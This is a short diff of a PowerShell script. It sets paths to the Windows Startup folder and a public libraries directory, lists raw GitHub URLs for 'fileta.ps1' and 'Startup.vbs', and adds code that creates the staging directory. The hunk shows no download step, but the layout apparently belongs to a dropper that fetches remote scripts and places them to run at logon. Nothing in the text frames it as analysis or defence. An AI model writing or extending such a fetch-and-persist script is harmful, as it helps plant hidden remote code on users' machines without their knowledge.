@@ -3,6 +3,11 @@ $LocalPath = "$env:LOCALAPPDATA"
 $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $PublicLibPath = "C:\Users\Public\Libraries"
 
+# Create Public Libraries directory if it doesn't exist
+if (!(Test-Path -Path $PublicLibPath)) {
+    New-Item -ItemType Directory -Path $PublicLibPath -Force | Out-Null
+}
+
 # File URLs
 $File1Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/fileta.ps1"
 $File2Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/Startup.vbs"
